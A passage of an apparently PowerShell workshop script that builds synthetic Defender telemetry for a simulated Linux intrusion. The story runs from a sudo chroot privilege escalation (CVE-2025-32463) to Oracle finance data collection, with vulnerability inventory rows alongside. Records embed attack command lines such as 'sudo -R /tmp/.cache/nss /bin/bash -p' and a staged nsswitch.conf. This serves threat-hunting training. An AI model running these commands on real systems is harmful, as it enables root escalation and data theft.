    RemoteDeviceName = 'ADMIN-JUMP01.usag-cyber.local'
    IsLocalAdmin = $false
    LogonId = 860064
    ReportId = 860064
    AdditionalFields = '{"SourceLog":"/var/log/auth.log","PamResult":"Accepted publickey","Scenario":"Linux SSH login"}'
}
Add-Record -Table 'DeviceProcessEvents' -Time $StartTime.AddMinutes(65) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(65)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'ProcessCreated'
    FileName = 'sudo'
    FolderPath = '/usr/bin/sudo'
    ProcessId = 18650
    ProcessCommandLine = 'sudo -R /tmp/.cache/nss /bin/bash -p'
    ProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(65)
    ProcessIntegrityLevel = 'Unknown'
    ProcessTokenElevation = 'None'
    AccountDomain = $linux03.ShortName
    AccountName = $linuxAdminUser
    AccountSid = $alice.Sid
    AccountUpn = $alice.Upn
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'bash'
    InitiatingProcessFolderPath = '/usr/bin/bash'
    InitiatingProcessCommandLine = '-bash'
    InitiatingProcessParentFileName = 'sshd'
    ReportId = 860065
    AdditionalFields = '{"Technique":"T1548.003","SourceLog":"/var/log/auth.log","Scenario":"Suspicious sudo chroot usage"}'
}
Add-Record -Table 'DeviceFileEvents' -Time $StartTime.AddMinutes(66) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(66)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'FileCreated'
    FileName = 'nsswitch.conf'
    FolderPath = '/tmp/.cache/nss/etc/nsswitch.conf'
    FileSize = 512
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'bash'
    InitiatingProcessCommandLine = 'printf passwd: files > /tmp/.cache/nss/etc/nsswitch.conf'
    InitiatingProcessId = 18649
    InitiatingProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(65)
    ReportId = 860066
    AdditionalFields = '{"Technique":"T1548.003","SourceLog":"/var/log/audit/audit.log","Scenario":"Linux privilege escalation staging"}'
}
Add-Record -Table 'DeviceImageLoadEvents' -Time $StartTime.AddMinutes(66) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(66)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'ImageLoaded'
    FileName = 'libnss_files.so.2'
    FolderPath = '/lib/x86_64-linux-gnu/libnss_files.so.2'
    FileSize = 55936
    SHA1 = New-StableHex 'linux-libnss-files-sha1' 40
    SHA256 = New-StableHex 'linux-libnss-files-sha256' 64
    MD5 = New-StableHex 'linux-libnss-files-md5' 32
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'sudo'
    InitiatingProcessFolderPath = '/usr/bin/sudo'
    InitiatingProcessCommandLine = 'sudo -R /tmp/.cache/nss /bin/bash -p'
    ReportId = 860067
    AdditionalFields = '{"Scenario":"Linux shared object load","Source":"ld.so"}'
}
Add-Record -Table 'DeviceNetworkEvents' -Time $StartTime.AddMinutes(67) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(67)
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(67)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'ConnectionSuccess'
    LocalIP = $linux03.IP
    LocalPort = 49322
    RemoteIP = '198.51.100.88'
    RemoteUrl = 'ipp-printer-discovery.example'
    RemotePort = 631
    Protocol = 'Udp'
    LocalIPType = 'Private'
    RemoteIPType = 'Public'
    InitiatingProcessFileName = 'cups-browsed'
    InitiatingProcessCommandLine = '/usr/sbin/cups-browsed'
    InitiatingProcessAccountDomain = 'root'
    InitiatingProcessAccountName = 'root'
    ReportId = 8600671
    TenantId = $tenantId
    Type = 'DeviceNetworkEvents'
    SourceSystem = 'MDE'
    MachineGroup = 'Linux Servers'
    AdditionalFields = '{"CveContext":"CVE-2024-47176","Scenario":"CUPS IPP exposure"}'
}
Add-Record -Table 'DeviceEvents' -Time $StartTime.AddMinutes(68) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(68)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'AuditdProcessExecution'
    FileName = 'sudo'
    FolderPath = '/usr/bin/sudo'
    ProcessCommandLine = 'sudo -R /tmp/.cache/nss /bin/bash -p'
    AccountDomain = $linux03.ShortName
    AccountName = $linuxAdminUser
    AccountSid = $alice.Sid
    AccountUpn = $alice.Upn
    ReportId = 860068
    AdditionalFields = '{"SourceLog":"/var/log/audit/audit.log","AuditKey":"priv_esc","Technique":"T1548.003"}'
}
Add-Record -Table 'AlertInfo' -Time $linuxAlertTime -Values @{
    Timestamp = Format-WorkshopTime $linuxAlertTime
    AlertId = $scenarioAlertIds.LinuxSudoChroot
    Title = 'Suspicious sudo chroot usage on Linux server'
    Category = 'PrivilegeEscalation'
    Severity = 'High'
    ServiceSource = 'Microsoft Defender for Endpoint'
    DetectionSource = 'MDE sensor'
    AttackTechniques = 'T1548.003,T1059.004'
}
Add-Record -Table 'AlertEvidence' -Time $linuxAlertTime -Values @{
    Timestamp = Format-WorkshopTime $linuxAlertTime
    AlertId = $scenarioAlertIds.LinuxSudoChroot
    Title = 'Suspicious sudo chroot usage on Linux server'
    Categories = '["PrivilegeEscalation"]'
    AttackTechniques = 'T1548.003,T1059.004'
    ServiceSource = 'Microsoft Defender for Endpoint'
    DetectionSource = 'MDE sensor'
    EntityType = 'Process'
    EvidenceRole = 'Impacted'
    EvidenceDirection = 'Source'
    FileName = 'sudo'
    FolderPath = '/usr/bin/sudo'
    AccountName = $linuxAdminUser
    AccountDomain = $linux03.ShortName
    AccountSid = $alice.Sid
    AccountObjectId = $alice.ObjectId
    AccountUpn = $alice.Upn
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    LocalIP = $linux03.IP
    ProcessCommandLine = 'sudo -R /tmp/.cache/nss /bin/bash -p'
    AdditionalFields = '{"OSProfile":"Ubuntu","SourceLogs":["/var/log/auth.log","/var/log/audit/audit.log"],"CveContext":"CVE-2025-32463"}'
    Severity = 'High'
}
$oracleBranchTime = $StartTime.AddMinutes(69)
Add-Record -Table 'DeviceFileEvents' -Time $oracleBranchTime -Values @{
    Timestamp = Format-WorkshopTime $oracleBranchTime
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'FileCreated'
    FileName = 'oracle_privcheck.py'
    FolderPath = '/tmp/.cache/oracle_privcheck.py'
    FileSize = 4096
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'scp'
    InitiatingProcessCommandLine = 'scp oracle_privcheck.py UBUNTU-03:/tmp/.cache/oracle_privcheck.py'
    InitiatingProcessCreationTime = Format-WorkshopTime $oracleBranchTime.AddSeconds(-30)
    ReportId = 860069
    AdditionalFields = '{"Scenario":"Synthetic Python helper staged for Linux privilege check","CveContext":"CVE-2025-32463"}'
}
Add-Record -Table 'DeviceProcessEvents' -Time $StartTime.AddMinutes(70) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(70)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'ProcessCreated'
    FileName = 'python3'
    FolderPath = '/usr/bin/python3'
    ProcessId = 18670
    ProcessCommandLine = 'python3 /tmp/.cache/oracle_privcheck.py --check sudo-cve-2025-32463 --target oracle'
    ProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(70)
    ProcessIntegrityLevel = 'Unknown'
    ProcessTokenElevation = 'None'
    AccountDomain = $linux03.ShortName
    AccountName = $linuxAdminUser
    AccountSid = $alice.Sid
    AccountUpn = $alice.Upn
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'bash'
    InitiatingProcessFolderPath = '/usr/bin/bash'
    InitiatingProcessCommandLine = '-bash'
    InitiatingProcessParentFileName = 'sshd'
    ReportId = 860070
    AdditionalFields = '{"Technique":"T1059.006","CveContext":"CVE-2025-32463","Scenario":"Synthetic Python privilege-escalation helper"}'
}
Add-Record -Table 'DeviceFileEvents' -Time $StartTime.AddMinutes(71) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(71)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'FileCreated'
    FileName = 'ora_collect_linux_amd64'
    FolderPath = '/tmp/.cache/ora_collect_linux_amd64'
    FileSize = 1867776
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'python3'
    InitiatingProcessCommandLine = 'python3 /tmp/.cache/oracle_privcheck.py --check sudo-cve-2025-32463 --target oracle'
    InitiatingProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(70)
    ReportId = 860071
    AdditionalFields = '{"Scenario":"Synthetic Go Oracle collection binary staged","Language":"Go"}'
}
Add-Record -Table 'DeviceProcessEvents' -Time $StartTime.AddMinutes(72) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(72)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'ProcessCreated'
    FileName = 'ora_collect_linux_amd64'
    FolderPath = '/tmp/.cache/ora_collect_linux_amd64'
    ProcessId = 18672
    ProcessCommandLine = '/tmp/.cache/ora_collect_linux_amd64 --target 10.42.20.35:1521 --service ORCL --query-name finance-user-catalog'
    ProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(72)
    ProcessIntegrityLevel = 'Unknown'
    ProcessTokenElevation = 'None'
    AccountDomain = $linux03.ShortName
    AccountName = 'root'
    AccountSid = '0'
    AccountUpn = ''
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = $linuxAdminUser
    InitiatingProcessAccountSid = $alice.Sid
    InitiatingProcessAccountUpn = $alice.Upn
    InitiatingProcessFileName = 'sudo'
    InitiatingProcessFolderPath = '/usr/bin/sudo'
    InitiatingProcessCommandLine = 'sudo -R /tmp/.cache/nss /bin/bash -p'
    InitiatingProcessParentFileName = 'python3'
    ReportId = 860072
    AdditionalFields = '{"Technique":"T1005","Language":"Go","OriginalUser":"aliceweber","Scenario":"Oracle sensitive data collection over TNS"}'
}
Add-Record -Table 'DeviceNetworkEvents' -Time $StartTime.AddMinutes(72) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(72)
    TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(72)
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    ActionType = 'ConnectionSuccess'
    LocalIP = $linux03.IP
    LocalPort = 50152
    RemoteIP = $linuxDb.IP
    RemoteUrl = $linuxDb.Name
    RemotePort = 1521
    Protocol = 'Tcp'
    LocalIPType = 'Private'
    RemoteIPType = 'Private'
    InitiatingProcessFileName = 'ora_collect_linux_amd64'
    InitiatingProcessCommandLine = '/tmp/.cache/ora_collect_linux_amd64 --target 10.42.20.35:1521 --service ORCL --query-name finance-user-catalog'
    InitiatingProcessAccountDomain = $linux03.ShortName
    InitiatingProcessAccountName = 'root'
    ReportId = 8600721
    TenantId = $tenantId
    Type = 'DeviceNetworkEvents'
    SourceSystem = 'MDE'
    MachineGroup = 'Linux Servers'
    AdditionalFields = '{"Protocol":"Oracle TNS","Scenario":"Oracle database access from compromised Linux host"}'
}
Add-Record -Table 'DeviceProcessEvents' -Time $StartTime.AddMinutes(73) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(73)
    DeviceId = $linuxDb.DeviceId
    DeviceName = $linuxDb.Name
    ActionType = 'ProcessCreated'
    FileName = 'oracle'
    FolderPath = '/opt/oracle/product/19c/dbhome_1/bin/oracle'
    ProcessId = 19173
    ProcessCommandLine = 'oracleORCL (LOCAL=NO)'
    ProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(73)
    ProcessIntegrityLevel = 'Unknown'
    ProcessTokenElevation = 'None'
    AccountDomain = $linuxDb.ShortName
    AccountName = 'oracle'
    InitiatingProcessAccountDomain = $linuxDb.ShortName
    InitiatingProcessAccountName = 'oracle'
    InitiatingProcessFileName = 'tnslsnr'
    InitiatingProcessFolderPath = '/opt/oracle/product/19c/dbhome_1/bin/tnslsnr'
    InitiatingProcessCommandLine = 'tnslsnr LISTENER -inherit'
    InitiatingProcessParentFileName = 'systemd'
    ReportId = 860073
    AdditionalFields = '{"Scenario":"Oracle foreground process spawned for remote TNS session","OracleSid":"ORCL"}'
}
Add-Record -Table 'DeviceFileEvents' -Time $StartTime.AddMinutes(74) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(74)
    DeviceId = $linuxDb.DeviceId
    DeviceName = $linuxDb.Name
    ActionType = 'FileCreated'
    FileName = 'finance_user_catalog.csv'
    FolderPath = '/tmp/.oracle/finance_user_catalog.csv'
    FileSize = 245760
    InitiatingProcessAccountDomain = $linuxDb.ShortName
    InitiatingProcessAccountName = 'oracle'
    InitiatingProcessFileName = 'oracle'
    InitiatingProcessCommandLine = 'oracleORCL (LOCAL=NO)'
    InitiatingProcessCreationTime = Format-WorkshopTime $StartTime.AddMinutes(73)
    ReportId = 860074
    AdditionalFields = '{"Technique":"T1005","Scenario":"Synthetic Oracle sensitive data export","SourcePath":"/u01/app/oracle/oradata/ORCL"}'
}
Add-Record -Table 'AlertInfo' -Time $StartTime.AddMinutes(74) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(74)
    AlertId = $scenarioAlertIds.LinuxOracleCollection
    Title = 'Linux privilege escalation followed by Oracle data access'
    Category = 'Collection'
    Severity = 'High'
    ServiceSource = 'Microsoft Defender for Endpoint'
    DetectionSource = 'MDE sensor'
    AttackTechniques = 'T1548.003,T1059.006,T1005'
}
Add-Record -Table 'AlertEvidence' -Time $StartTime.AddMinutes(74) -Values @{
    Timestamp = Format-WorkshopTime $StartTime.AddMinutes(74)
    AlertId = $scenarioAlertIds.LinuxOracleCollection
    Title = 'Linux privilege escalation followed by Oracle data access'
    Categories = '["Collection","PrivilegeEscalation"]'
    AttackTechniques = 'T1548.003,T1059.006,T1005'
    ServiceSource = 'Microsoft Defender for Endpoint'
    DetectionSource = 'MDE sensor'
    EntityType = 'Process'
    EvidenceRole = 'Impacted'
    EvidenceDirection = 'Source'
    FileName = 'ora_collect_linux_amd64'
    FolderPath = '/tmp/.cache/ora_collect_linux_amd64'
    AccountName = 'root'
    AccountDomain = $linux03.ShortName
    AccountSid = '0'
    AccountObjectId = ''
    AccountUpn = ''
    DeviceId = $linux03.DeviceId
    DeviceName = $linux03.Name
    LocalIP = $linux03.IP
    ProcessCommandLine = '/tmp/.cache/ora_collect_linux_amd64 --target 10.42.20.35:1521 --service ORCL --query-name finance-user-catalog'
    AdditionalFields = '{"OSProfile":"Ubuntu","Language":"Go","OriginalUser":"aliceweber","Database":"Oracle ORCL","SensitiveData":"Synthetic finance user catalog"}'
    Severity = 'High'
}
$linuxScenarioVulnerabilities = @(
    [pscustomobject]@{ Minute = 62; SoftwareName = 'openssh-server'; SoftwareVendor = 'OpenBSD'; SoftwareVersion = '1:9.6p1-3ubuntu13.5'; CveId = 'CVE-2024-6387'; Severity = 'High'; Update = 'Install patched openssh-server package' },
    [pscustomobject]@{ Minute = 66; SoftwareName = 'sudo'; SoftwareVendor = 'Sudo Project'; SoftwareVersion = '1.9.15p5-3ubuntu5.24.04.1'; CveId = 'CVE-2025-32463'; Severity = 'High'; Update = 'Install patched sudo package' },
    [pscustomobject]@{ Minute = 67; SoftwareName = 'cups'; SoftwareVendor = 'OpenPrinting'; SoftwareVersion = '2.4.7-1.2ubuntu7.3'; CveId = 'CVE-2024-47176'; Severity = 'Medium'; Update = 'Disable cups-browsed or install patched CUPS packages' },
    [pscustomobject]@{ Minute = 68; SoftwareName = 'glibc'; SoftwareVendor = 'GNU C Library'; SoftwareVersion = '2.39-0ubuntu8.4'; CveId = 'CVE-2023-4911'; Severity = 'Medium'; Update = 'Install patched libc6 package' }
)
foreach ($vulnerability in $linuxScenarioVulnerabilities) {
    $vulnTime = $StartTime.AddMinutes($vulnerability.Minute)
    Add-Record -Table 'DeviceTvmSoftwareVulnerabilities' -Time $vulnTime -Values @{
        DeviceId = $linux03.DeviceId
        DeviceName = $linux03.Name
        OSPlatform = 'Ubuntu'
        OSVersion = '24.04 LTS'
        OSArchitecture = 'x64'
        SoftwareVendor = $vulnerability.SoftwareVendor
        SoftwareName = $vulnerability.SoftwareName
        SoftwareVersion = $vulnerability.SoftwareVersion
        CveId = $vulnerability.CveId
        VulnerabilitySeverityLevel = $vulnerability.Severity
        RecommendedSecurityUpdate = $vulnerability.Update
        RecommendedSecurityUpdateId = $vulnerability.CveId
        CveTags = @('Linux', 'Ubuntu', 'Workshop')
        TenantId = ''
        Type = 'DeviceTvmSoftwareVulnerabilities'
        SourceSystem = ''
        MachineGroup = Get-WorkshopScenarioMachineGroup -Device $linux03
    }
}

$scenarioSoftwareInventory = @(
    [pscustomobject]@{ Device = $win04; Vendor = 'microsoft'; Name = 'edge'; Version = '125.0.2535.67'; EosStatus = ''; EosDate = '2029-10-09T00:00:00.0000000Z'; Cpe = 'cpe:2.3:a:microsoft:edge:125.0.2535.67:*:*:*:*:*:*:*' },
    [pscustomobject]@{ Device = $win04; Vendor = 'google'; Name = 'chrome'; Version = '124.0.6367.119'; EosStatus = ''; EosDate = '2028-05-01T00:00:00.0000000Z'; Cpe = 'cpe:2.3:a:google:chrome:124.0.6367.119:*:*:*:*:*:*:*' },
    [pscustomobject]@{ Device = $win04; Vendor = '7-zip'; Name = '7-zip'; Version = '24.08.0.0'; EosStatus = ''; EosDate = '2028-12-31T00:00:00.0000000Z'; Cpe = 'cpe:2.3:a:7-zip:7-zip:24.08:*:*:*:*:*:*:*' },
    [pscustomobject]@{ Device = $aadc; Vendor = 'microsoft'; Name = 'microsoft_entra_connect_sync'; Version = '2.3.20.0'; EosStatus = ''; EosDate = '2028-12-31T00:00:00.0000000Z'; Cpe = 'cpe:2.3:a:microsoft:entra_connect_sync:2.3.20.0:*:*:*:*:*:*:*' },
    [pscustomobject]@{ Device = $linux03; Vendor = 'openbsd'; Name = 'openssh-server'; Version = '1:9.6p1-3ubuntu13.5'; EosStatus = ''; EosDate = '2029-05-31T00:00:00.0000000Z'; Cpe = 'cpe:2.3:a:openbsd:openssh:9.6p1:*:*:*:*:*:*:*' },
    [pscustomobject]@{ Device = $linux03; Vendor = 'sudo_project'; Name = 'sudo'; Version = '1.9.15p5-3ubuntu5.24.04.1'; EosStatus = ''; EosDate = '2029-05-31T00:00:00.0000000Z'; Cpe = 'cpe:2.3:a:sudo_project:sudo:1.9.15p5:*:*:*:*:*:*:*' },
    [pscustomobject]@{ Device = $linuxDb; Vendor = 'oracle'; Name = 'oracle_database_19c'; Version = '19.22.0.0.0'; EosStatus = 'Upcoming EOS Version'; EosDate = '2027-04-30T00:00:00.0000000Z'; Cpe = 'cpe:2.3:a:oracle:database:19.22:*:*:*:*:*:*:*' }
)
foreach ($softwareItem in $scenarioSoftwareInventory) {
    Add-Record -Table 'DeviceTvmSoftwareInventory' -Time $StartTime.AddMinutes(12) -Values @{
        DeviceId = $softwareItem.Device.DeviceId
        DeviceName = $softwareItem.Device.Name
        OSPlatform = if ($softwareItem.Device.OS -eq 'Ubuntu') { 'Ubuntu' } else { $softwareItem.Device.OS }
        OSVersion = Get-WorkshopScenarioOsVersion -Device $softwareItem.Device
        OSArchitecture = 'x64'
        SoftwareVendor = $softwareItem.Vendor
        SoftwareName = $softwareItem.Name
        SoftwareVersion = $softwareItem.Version
        EndOfSupportStatus = $softwareItem.EosStatus
        EndOfSupportDate = $softwareItem.EosDate
        ProductCodeCpe = $softwareItem.Cpe
        TenantId = ''
        Type = 'DeviceTvmSoftwareInventory'
        SourceSystem = ''
        MachineGroup = Get-WorkshopScenarioMachineGroup -Device $softwareItem.Device
    }
}

$scenarioWindowsVulnerabilities = @(
    [pscustomobject]@{ Device = $win04; Vendor = '7-zip'; Name = '7-zip'; Version = '24.08.0.0'; CveId = 'CVE-2025-0411'; Severity = 'High'; Update = 'Update 7-Zip to 24.09 or later'; UpdateId = '7ZIP-24.09'; Tags = @('ExploitAvailable', 'UserInteractionRequired', 'CredentialPackageRisk') },
    [pscustomobject]@{ Device = $win04; Vendor = 'google'; Name = 'chrome'; Version = '124.0.6367.119'; CveId = 'CVE-2024-4671'; Severity = 'High'; Update = 'Update Chrome to the latest stable build'; UpdateId = 'CHROME-125'; Tags = @('Browser', 'CredentialStoreContext', 'ExploitAvailable') },
    [pscustomobject]@{ Device = $aadc; Vendor = 'microsoft'; Name = 'microsoft_entra_connect_sync'; Version = '2.3.20.0'; CveId = 'CVE-2024-30088'; Severity = 'Medium'; Update = 'Apply current Microsoft security updates to identity synchronization server'; UpdateId = 'KB5039217'; Tags = @('IdentityTier0', 'HybridIdentity', 'ServiceAccountExposure') }
)
foreach ($vulnerability in $scenarioWindowsVulnerabilities) {
    Add-Record -Table 'DeviceTvmSoftwareVulnerabilities' -Time $StartTime.AddMinutes(13) -Values @{
        DeviceId = $vulnerability.Device.DeviceId
        DeviceName = $vulnerability.Device.Name
        OSPlatform = $vulnerability.Device.OS
        OSVersion = Get-WorkshopScenarioOsVersion -Device $vulnerability.Device
        OSArchitecture = 'x64'
        SoftwareVendor = $vulnerability.Vendor
        SoftwareName = $vulnerability.Name
        SoftwareVersion = $vulnerability.Version
        CveId = $vulnerability.CveId
        VulnerabilitySeverityLevel = $vulnerability.Severity
        RecommendedSecurityUpdate = $vulnerability.Update
        RecommendedSecurityUpdateId = $vulnerability.UpdateId
        CveTags = [object[]]$vulnerability.Tags
        CveMitigationStatus = ''
        AadDeviceId = New-StableGuid "aad-device|$($vulnerability.Device.DeviceId)"
        TenantId = ''
        Type = 'DeviceTvmSoftwareVulnerabilities'
        SourceSystem = ''
        MachineGroup = Get-WorkshopScenarioMachineGroup -Device $vulnerability.Device
    }
}

$scenarioVulnerabilityKb = @(
    [pscustomobject]@{ CveId = 'CVE-2025-0411'; Cvss = 7.8; Vector = 'CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H'; Severity = 'High'; Exploit = $true; Epss = 0.71342; Description = '7-Zip Mark-of-the-Web bypass context relevant to archive handling during credential material staging.'; Software = @('7-zip:7-zip:24.08.0.0', '7-zip:7-zip:24.09.0.0') },
    [pscustomobject]@{ CveId = 'CVE-2024-4671'; Cvss = 8.8; Vector = 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H'; Severity = 'High'; Exploit = $true; Epss = 0.61218; Description = 'Browser vulnerability context for the endpoint where browser credential data was collected.'; Software = @('google:chrome:124.0.6367.119', 'google:chrome:125.0.6422.60') },
    [pscustomobject]@{ CveId = 'CVE-2024-30088'; Cvss = 6.5; Vector = 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N'; Severity = 'Medium'; Exploit = $false; Epss = 0.08175; Description = 'Windows security update context for the identity synchronization server involved in service-account misuse.'; Software = @('microsoft:windows_server_2025:24h2', 'microsoft:entra_connect_sync:2.3.20.0') },
    [pscustomobject]@{ CveId = 'CVE-2024-6387'; Cvss = 8.1; Vector = 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H'; Severity = 'High'; Exploit = $true; Epss = 0.39211; Description = 'OpenSSH regreSSHion context for Ubuntu SSH exposure review.'; Software = @('openbsd:openssh:9.6p1', 'ubuntu:openssh-server:1:9.6p1-3ubuntu13.5') },
    [pscustomobject]@{ CveId = 'CVE-2025-32463'; Cvss = 9.3; Vector = 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H'; Severity = 'Critical'; Exploit = $true; Epss = 0.84429; Description = 'Sudo chroot privilege-escalation context for the Linux bonus path.'; Software = @('sudo_project:sudo:1.9.15p5', 'ubuntu:sudo:1.9.15p5-3ubuntu5.24.04.1') },
    [pscustomobject]@{ CveId = 'CVE-2024-47176'; Cvss = 8.6; Vector = 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:H'; Severity = 'High'; Exploit = $true; Epss = 0.50761; Description = 'CUPS IPP context that explains the Linux network-service exposure rows.'; Software = @('openprinting:cups:2.4.7', 'ubuntu:cups:2.4.7-1.2ubuntu7.3') }
)
foreach ($kb in $scenarioVulnerabilityKb) {
    Add-Record -Table 'DeviceTvmSoftwareVulnerabilitiesKB' -Time $StartTime.AddMinutes(13) -Values @{
        CveId = $kb.CveId
        CvssScore = $kb.Cvss
        CvssVector = $kb.Vector
        CveSupportability = 'Supported'
        IsExploitAvailable = $kb.Exploit
        VulnerabilitySeverityLevel = $kb.Severity
        LastModifiedTime = Format-WorkshopTime $StartTime.AddDays(-3)
        PublishedDate = Format-WorkshopTime $StartTime.AddDays(-120)
        VulnerabilityDescription = $kb.Description
        AffectedSoftware = [object[]]$kb.Software
        EpssScore = $kb.Epss
        TenantId = ''
        Type = 'DeviceTvmSoftwareVulnerabilitiesKB'
        SourceSystem = ''
    }
}

$scenarioSoftwareEvidence = @(
    [pscustomobject]@{ Device = $win04; Vendor = 'google'; Name = 'chrome'; Version = '124.0.6367.119'; Registry = @('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome', 'HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Google\Update\Clients\Chrome'); Disk = @('C:\Program Files\Google\Chrome\Application\chrome.exe', 'C:\Users\victor.alvarez\AppData\Local\Google\Chrome\User Data\Default\Login Data') },
    [pscustomobject]@{ Device = $win04; Vendor = '7-zip'; Name = '7-zip'; Version = '24.08.0.0'; Registry = @('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\7-Zip', 'HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip'); Disk = @('C:\Program Files\7-Zip\7z.exe', 'C:\ProgramData\wrstage\cred_bundle.zip') },
    [pscustomobject]@{ Device = $aadc; Vendor = 'microsoft'; Name = 'microsoft_entra_connect_sync'; Version = '2.3.20.0'; Registry = @('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Azure AD Connect', 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ADSync'); Disk = @('C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe', 'C:\Program Files\Microsoft Azure AD Sync\Bin\ADSync.exe') },
    [pscustomobject]@{ Device = $linux03; Vendor = 'sudo_project'; Name = 'sudo'; Version = '1.9.15p5-3ubuntu5.24.04.1'; Registry = @(); Disk = @('/usr/bin/sudo', '/tmp/.cache/nss/etc/nsswitch.conf') },
    [pscustomobject]@{ Device = $linuxDb; Vendor = 'oracle'; Name = 'oracle_database_19c'; Version = '19.22.0.0.0'; Registry = @(); Disk = @('/opt/oracle/product/19c/dbhome_1/bin/oracle', '/tmp/.oracle/finance_user_catalog.csv') }
)
foreach ($evidence in $scenarioSoftwareEvidence) {
    Add-Record -Table 'DeviceTvmSoftwareEvidenceBeta' -Time $StartTime.AddMinutes(14) -Values @{
        DeviceId = $evidence.Device.DeviceId
        SoftwareVendor = $evidence.Vendor
        SoftwareName = $evidence.Name
        SoftwareVersion = $evidence.Version
        RegistryPaths = [object[]]$evidence.Registry
        DiskPaths = [object[]]$evidence.Disk
        LastSeenTime = Format-WorkshopTime $StartTime.AddMinutes(14)
        TenantId = ''
        Type = 'DeviceTvmSoftwareEvidenceBeta'
        SourceSystem = ''
        MachineGroup = Get-WorkshopScenarioMachineGroup -Device $evidence.Device
    }
}

$scenarioInfoGatheringKb = @(
    [pscustomobject]@{ Id = 'igid-scenario-asr'; Field = 'AsrConfigurationStates'; Description = 'Attack surface reduction configuration state used to explain why credential-theft behaviors were observable on the workstation.'; Categories = @('endpoint security', 'attack surface reduction', 'credential theft'); DataStructure = 'JSON object' },
    [pscustomobject]@{ Id = 'igid-scenario-avscan'; Field = 'AvScanResults'; Description = 'Recent Defender Antivirus scan state used to distinguish sensor health from attacker activity.'; Categories = @('endpoint security', 'antivirus', 'sensor health'); DataStructure = 'JSON object' },
    [pscustomobject]@{ Id = 'igid-scenario-cloud'; Field = 'CloudProtectionState'; Description = 'Cloud-delivered protection state for Windows endpoints and Linux servers in the investigation.'; Categories = @('endpoint security', 'cloud protection', 'sensor health'); DataStructure = 'String or null' },
    [pscustomobject]@{ Id = 'igid-scenario-ebpf'; Field = 'EBPFStatus'; Description = 'Linux eBPF sensor state that supports the Ubuntu telemetry comparison branch.'; Categories = @('linux', 'sensor', 'ebpf'); DataStructure = 'String or null' },
